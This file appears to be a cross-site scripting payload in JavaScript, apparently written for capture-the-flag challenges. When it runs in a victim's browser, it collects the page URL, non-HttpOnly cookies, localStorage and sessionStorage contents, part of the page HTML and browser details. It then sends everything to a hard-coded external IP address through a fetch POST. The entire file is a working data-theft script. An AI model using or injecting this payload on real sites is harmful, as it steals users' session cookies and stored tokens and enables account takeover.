(function() {
    const info = {};

    // Basic info
    info.url = location.href;
    info.referrer = document.referrer;
    info.cookie = document.cookie; // non-HttpOnly only
    info.userAgent = navigator.userAgent;
    info.title = document.title;
    info.origin = location.origin;

    // Storage
    info.localStorage = {...localStorage};
    info.sessionStorage = {...sessionStorage};

    // Document HTML snapshot (often needed in CTF)
    info.html = document.documentElement.innerHTML.slice(0, 5000); // truncate to avoid oversize

    // Navigator info (CTF useful)
    info.language = navigator.language;
    info.platform = navigator.platform;

    // Screen info
    info.screen = {
        width: screen.width,
        height: screen.height
    };

    // Timing
    info.time = Date.now();

    // Send to your server
    fetch("http://8.209.219.48:8080/collect", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(info)
    });
})();
